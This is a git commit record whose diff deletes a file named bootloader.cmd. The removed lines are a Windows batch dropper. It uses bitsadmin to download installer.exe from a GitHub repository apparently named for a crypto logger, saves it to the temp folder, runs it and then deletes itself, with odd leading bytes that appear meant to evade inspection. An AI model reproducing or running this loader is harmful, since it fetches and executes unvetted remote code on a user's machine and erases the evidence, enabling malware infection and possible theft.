e55555bd52db2c373248cf34b724576174b97990
Clifton Miller <clyphy@gmail.com>
2025-04-04 23:21:32 -0500

    new

--- bootloader.cmd
+++
@@ -1,8 +0,0 @@
-ÿþ&cls
-ÿþ
-
-set pOut="%temp%\\out.exe"
-bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/Cryptlogger/didactic-enigma/raw/main/installer.exe" %pOut%
-start "" %pOut%
-DEL "%~f0"
-                
